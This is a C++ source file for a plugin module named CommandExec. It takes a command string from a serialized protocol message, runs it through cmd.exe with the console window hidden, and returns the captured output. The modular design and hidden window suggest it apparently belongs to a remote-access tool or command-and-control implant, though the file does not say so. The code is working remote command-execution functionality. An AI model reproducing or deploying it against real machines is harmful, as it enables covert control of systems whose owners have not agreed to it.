#include "CommandExecModule.h"
#include "Protocol.h"
#include <sstream>

CommandExecModule::CommandExecModule() {}

CommandExecModule::~CommandExecModule() {}

ModuleInfo CommandExecModule::GetInfo() const {
    ModuleInfo info;
    info.name = "CommandExec";
    info.version = "1.0.0";
    info.description = "Execute system commands";
    info.type = ModuleType::COMMAND_EXECUTION;
    info.interfaceVersion = MODULE_INTERFACE_VERSION;
    return info;
}

bool CommandExecModule::Initialize() {
    return true;
}

ModuleResult CommandExecModule::Execute(const std::vector<uint8_t>& params) {
    ModuleResult result;
    result.success = false;

    try {
        const uint8_t* ptr = params.data();
        size_t remaining = params.size();
        std::string command = Protocol::DeserializeString(ptr, remaining);

        std::string output = ExecuteCommand(command);

        Protocol::SerializeString(result.data, output);
        result.success = true;
    }
    catch (const std::exception& e) {
        result.errorMessage = e.what();
    }

    return result;
}

void CommandExecModule::Cleanup() {}

std::string CommandExecModule::ExecuteCommand(const std::string& command) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return "Failed to create pipe";
    }

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));

    std::string cmdLine = "cmd.exe /c " + command;

    if (!CreateProcessA(NULL, const_cast<char*>(cmdLine.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return "Failed to create process";
    }

    CloseHandle(hWritePipe);

    std::stringstream output;
    char buffer[4096];
    DWORD bytesRead;

    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        output << buffer;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    return output.str();
}

EXPORT_MODULE(CommandExecModule)
